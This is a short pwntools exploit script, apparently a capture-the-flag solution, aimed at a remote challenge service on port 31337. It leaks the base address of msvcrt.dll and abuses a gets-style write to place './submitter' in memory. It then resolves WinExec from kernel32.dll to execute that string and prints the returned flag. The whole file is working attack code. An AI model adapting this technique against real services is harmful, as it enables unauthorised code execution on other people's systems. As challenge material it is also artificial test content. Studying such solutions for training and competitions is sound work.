#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
io.sendlineafter('?', 'msvcrt.dll')
io.recvuntil(b"Module handle: ")
module_base = int(io.recv(16), 16)
io.success(f'module_base @ {hex(module_base)}')

target = module_base + 0x70000 + 0x100
io.sendline(b'gets')
io.sendlineafter(b'?', str(target).encode())
io.sendline(b'./submitter')

io.sendlineafter('?', b"kernel32.dll")
io.recvuntil(b"Module handle: ")
io.sendline(b'WinExec')
io.sendlineafter(b'?', str(target).encode())
io.recvuntil('Flag: ')
flag = io.recvline().split(b'\n')[0].decode().strip()
log.info('Flag: %s', flag)
io.interactive()
